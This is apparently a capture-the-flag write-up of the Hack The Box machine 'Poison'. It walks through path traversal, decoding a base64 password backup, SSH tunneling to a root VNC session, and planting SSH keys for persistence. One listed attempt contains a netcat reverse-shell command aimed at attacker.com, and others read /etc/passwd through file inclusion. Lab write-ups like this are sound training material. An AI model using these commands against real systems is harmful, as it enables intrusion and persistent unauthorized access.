---
title: "[MEDIUM] HTB-Poison"
draft: false
tags:
  - htb
  - linux
  - freebsd
  - lfi
  - zip2john
  - vnc
  - tunneling
  - persistence
---
## Information Gathering

### Rustscan

Only **HTTP** and **SSH** were open -> Typical HTB Linux machine

  
```bash
┌──(yoon㉿kali)-[~/Documents/htb/poison]
└─$ rustscan --addresses 10.10.10.84 --range 1-65535

.----. .-. .-. .----..---. .----. .---. .--. .-. .-.
| {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \ | `| |
| .-. \| {_} |.-._} } | | .-._} }\ }/ /\ \| |\ |
`-' `-'`-----'`----' `-' `----' `---' `-' `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy :
: https://github.com/RustScan/RustScan :
--------------------------------------
<snip>>
Host is up, received syn-ack (0.60s latency).
Scanned at 2024-03-20 10:30:29 EDT for 0s

PORT STATE SERVICE REASON
22/tcp open ssh syn-ack
80/tcp open http syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.20 seconds
```

  

### Nmap

  

I ran nmap default script scan on it but nothing useful was found.

  

`nmap -sVC -p 22,80 -v 10.10.10.84`

  

```bash
┌──(yoon㉿kali)-[~/Documents/htb/poison]
└─$ nmap -sVC -p 22,80 -v 10.10.10.84
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-20 10:45 EDT
<snip>>
Nmap scan report for 10.10.10.84 (10.10.10.84)
Host is up (0.52s latency).

PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey:
| 2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
| 256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
|_ 256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
80/tcp open http Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

<snip>
Nmap done: 1 IP address (1 host up) scanned in 184.35 seconds
```

  

## Enumeration
### HTTP - TCP 80

  

Accessing the target through browser, I see this webpage is hosting service that let's you test local .php scripts:

  

![](https://i.imgur.com/VLYiDye.png)


  

It seemed that **in.php**, **info.php**, **listfiles.php**, and **phpinfo.php** scripts are provided as an example to be tested.

  

I typed in random file with .php extension to see what will happen and discovered that this service running on port 80 is opening file from **/usr/local/www/apache24/data/browse.php**.

  

Also I can tell that files that are in **/usr/local/www/apache24/data** are being opened.

  

![](https://i.imgur.com/v0qdw35.png)


  

So at this point, I had two plans:

- Path Traversal Vulnerability?
- Directory Bruteforce?

  

#### Directory Bruteforce

  

I first tried on directory Brute-forcing using Feroxbuster but nothing interesting was discovered:

  

`sudo feroxbuster -u http://10.10.10.84 -n -x php -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`

  

![](https://i.imgur.com/Y5CcrZC.png)


  

**info.php** was one of the example scripts and it showed bunch of information including hostname and Kernel version.

  

![](https://i.imgur.com/ZHZuTib.png)


  

#### Path Traversal (Success!)

  
  

I checked for **path traversal** vulnerability and luckily it was vulnerable to it:

  

`http://10.10.10.84/browse.php?file=../../../../../../../etc/passwd`

  

![](https://i.imgur.com/0p9vd0k.png)


  

I passed the request to Burp Suite to play around with it more:

  

![](https://i.imgur.com/wnH2n3b.png)


  
  

Following [this article](https://aditya-chauhan17.medium.com/local-file-inclusion-lfi-to-rce-7594e15870e1), I tried elevating path traversal vulnerability to RCE but it was successful.

  

Some of my attempts:

  

```bash
http://example.com/index.php?page=/etc/passwd&cmd=id

http://example.com/index.php?page=/var/log/apache/access.log&cmd=nc%20-e%20/bin/bash%20attacker.com%204444

http://example.com/index.php?page=php://input&cmd=cat%20/etc/passwd
```

  

I was stuck at this point, so I went back through my notes again and I discovered I haven't checked on example scripts yet.

  

#### listfiles.php

Opening **listfiles.php**, it revealed that there is a file named **pwdbackup.txt**:
  

![](https://i.imgur.com/W7vV5Da.png)


  

#### pwdbackup.txt

  

Accessing **pwdbackup.txt** on browser, it showed me long encoded password hash:

  

![](https://i.imgur.com/4SzwQXQ.png)


  

## Shell as charix

### Cracking Hash

  

It says the password is encoded at least 13 times but it seemed to be encoded using base64 multiple times which could be easily cracked.

  

I created base64 decoder using python that it decodes until readable content is obtained:

  

```python
import base64

encoded_string = "Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0 NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO Ukd4RVdub3dPVU5uUFQwSwo="

decoded_string = encoded_string

# Iterate until readable content is obtained
while True:
try:
decoded_string = base64.b64decode(decoded_string)
except:
break

print(decoded_string.decode())
```

  

Now I have cracked password: `Charix!2#4%6&8(0`

  
  
  

![](https://i.imgur.com/THSi00C.png)


  

Remembering from **/etc/passwd** file earlier, user **charix** must be the valid user for this password.

  

### SSH

  

As expected, using the cracked password for user **charix** and I was able to sign in:

  

`ssh charix@10.10.10.84`

  

![](https://i.imgur.com/sw2pBqL.png)


  

## Privesc: charix to root

### secret.zip

  

On **/home/charix**, I found **secret.zip**

  

![](https://i.imgur.com/TwH2pzn.png)


  

I tried unzipping it but it was asking for a password:

  

![](https://i.imgur.com/5siJdZJ.png)


  

I decided to move the zip to local kali machine to crack it.
  

Using python http server and wget I was able to move it locally:

  

![](https://i.imgur.com/V2WYRKM.png)


  Using **zip2john**, I turned the zip file into john crackable format:

`sudo zip2john secret.zip > zip.hashes`


![](https://i.imgur.com/ZvpPSQb.png)

I tried cracking it using John, but somehow john wasn't detecting any hashes which up until this point I still don't understand why.  

Since I failed on cracking, I tried password that I found for user **charix** and it worked!

  

![](https://i.imgur.com/ZpYsNOx.png)

However, unzipped file was not readable and it seemed that I have to take more steps to use this file.
  

![](https://i.imgur.com/ZpghGHX.png)


  

### VNC as root

  
  
  Checking on what ports are open internally, I found VNC was open internally on port **5801** and **5901**: 
  

`netstat -an -p tcp`

![](https://i.imgur.com/jTMpE36.png)


On process, I was able to grep vnc running currently:

`ps -aux | grep vnc`

![](https://i.imgur.com/1Cf6taW.png)

Looking at the process once more, it showed that vnc was being ran as root any it authenticates itself by grabbing password file from **/root/.vnc/passwd**:
  

```bash
charix@Poison:/tmp % ps -aux | grep vnc

root 529 0.0 0.7 23620 7432 v0- I 15:16 0:00.02 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/passwd -rfbport 5901 -localhost -nolisten tcp :1
```

  

### Port Forwarding with Chisel (Failed)

Since chisel is my favorite port forwarding tool, I decided to go for chisel. 

I first uploaded chisel to the target using Python HTTP server and wget:
  

![](https://i.imgur.com/OWoMKiJ.png)


Now on local Kali machine, I set up chisel server to listen on port 9000:


![](https://i.imgur.com/Xkr0TTj.png)


Back on target system, I tunneled port 5901 to Kali machine's port 9000:

![](https://i.imgur.com/hp9jyE5.png)

I forgot about this system being **FreeBSD**, so chisel won't work here since it is coded for Linux AMD.
  

### Tunneling with SSH (Success!)

Since Chisel failed, I moved on to SSH tunneling

`ssh -L 5902:localhost:5901 -N -f -l charix 10.10.10.84`

![](https://i.imgur.com/B0up5i0.png)

- `-L 5902:localhost:5901`: Specifies that the local port 5902 on my machine should be forwarded to port 5901 on the remote server.    
- `-N`: Instructs `ssh` not to execute any commands on the remote server after establishing the connection. This is useful when you only need to set up port forwarding without running any remote commands.
- `-f`: Requests `ssh` to go into the background just before it executes the command provided. This allows you to continue using the terminal for other tasks without keeping the `ssh` connection open in the foreground.
- `-l charix`: Specifies the username (`charix`) to use when logging in to the remote server. This is followed by the IP address of the remote server (`10.10.10.84`).
  
I confirmed tunneling through nmap as such:

`nmap -p 5902 -sVC localhost`

  

![](https://i.imgur.com/ZdO4ZNZ.png)


Now using **vncviewer** and cracked zip file, I can VNC open the target machine as root:

`vncviewer -passwd secret localhost:5902`

  

![](https://i.imgur.com/4HKcX6L.png)


  
![](https://i.imgur.com/ttIe7mq.png)


  

## Beyond Root

### SSH Persistence


First go to **/root/.ssh** and generate SSH Private & Public Keys:
  

`ssh-keygen -f mykey`

  

![](https://i.imgur.com/1VCnHWd.png)


  
  

Copy public key(mykey.pub) to authorized_keys using `cat mykey.pub > authorized_keys` and now you will see these three files in .ssh directory:

  

![](https://i.imgur.com/YxmuDGb.png)


  
  

I needed to copy private key(mykey) to my local Kali machine but Copy Paste wasn't working on VNC environment so I set up a Python HTTP Server and download private key to my local machine:

  

![](https://i.imgur.com/5nyI14E.png)


  
  
  
  
  
  
  
  

Back in your target system, change permission for **.ssh** directory and **authorized_keys** file: `chmod 700 .ssh` & `chmod 600 .ssh/authorized_keys`

  
  
  

![](https://i.imgur.com/zBFykhg.png)


  

Now I can SSH in as root:

  
  

![](https://i.imgur.com/gwnMRvp.png)
